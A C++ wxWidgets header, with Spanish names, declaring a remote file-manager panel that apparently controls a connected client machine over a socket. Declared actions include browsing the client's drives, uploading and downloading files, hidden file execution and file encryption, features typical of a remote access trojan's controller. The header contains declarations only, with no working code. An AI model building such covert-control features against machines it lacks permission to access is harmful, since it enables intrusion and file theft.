#ifndef __PANEL_FILE_MANAGER
#define __PANEL_FILE_MANAGER

#include "headers.hpp"

class ListCtrlManager;

class panelFileManager: public wxPanel{
	public:
		ListCtrlManager* listManager = nullptr;
		
		void CrearLista();
		wxString RutaActual();
		void EnviarComando(std::string pComando, int iComando);
		void EnviarArchivo(const std::string cPath, const char* rPath, std::string strCliente);

		panelFileManager(wxWindow* pParent);

		//Eventos
		void OnToolBarClick(wxCommandEvent& event);
		
		//Variables
		int iMODE = -1;
		wxStaticText* p_RutaActual = nullptr;
		std::vector<wxString> c_RutaActual;
		std::string strID = "";  //ID del cliente
		std::string strIP = "";  //IP del cliente
		SOCKET sckCliente = INVALID_SOCKET;

		void ActualizarRuta(const char*& pBuffer);

	private:
		wxToolBar* p_ToolBar = nullptr;
		
		wxDECLARE_EVENT_TABLE();

};

class ListCtrlManager : public wxListCtrl {
	public:
		panelFileManager* itemp = nullptr;
		wxActivityIndicator* m_indicator = nullptr;

		ListCtrlManager(wxWindow* parent, const wxWindowID id, 
			            const wxPoint& pos, const wxSize& size, long style)
			: wxListCtrl(parent, id, pos, size, style) {}

		void ListarDir(const char* strData);
		void ListarEquipo(const std::vector<std::string> vcDrives);
		
		//Carga
		void MostrarCarga();
		void OcultarCarga();

	private:
		std::mutex mtx_fm;
		std::mutex mtx_carga;

		void OnActivated(wxListEvent& event);

		void ShowContextMenu(const wxPoint& pos, bool isFolder);
		void OnContextMenu(wxContextMenuEvent& event);

		std::string ArchivoSeleccionado();
		std::string CarpetaActual();
		
		//Eventos acciones menu contextual
		void OnCrearFolder(wxCommandEvent& event);
		void OnCrearArchivo(wxCommandEvent& event);
		void OnBorrarArchivo(wxCommandEvent& event);
		void OnEditarArchivo(wxCommandEvent& event);
		void OnRenombrarArchivo(wxCommandEvent& event);
		void OnDescargarArchivo(wxCommandEvent& event);
		void OnEjecutarArchivo_Visible(wxCommandEvent& event);
		void OnEjecutarArchivo_Oculto(wxCommandEvent& event);
		void OnSubirArchivo(wxCommandEvent& event);
		void OnEncriptarArchivo(wxCommandEvent& event);

		wxDECLARE_EVENT_TABLE();
};


#endif